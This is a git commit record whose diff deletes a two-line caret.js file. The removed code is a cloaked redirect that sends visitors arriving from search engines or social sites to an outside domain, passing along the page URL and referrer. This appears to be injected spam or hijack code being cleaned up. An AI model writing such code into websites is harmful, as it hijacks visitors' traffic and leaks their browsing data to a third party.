2161ce1e63cff3216c7aac2e70fead935ff265ba
Aini Sastra <aini.sastra@gmail.com>
2022-10-15 08:54:15 +0800

    Delete caret.js

--- caret.js
+++
@@ -1,2 +0,0 @@
-var ars = 'https://www.caretxdigital.com';
-if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'msn.', 'baidu.', 'slurp.', 'sogou.','dogpile.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
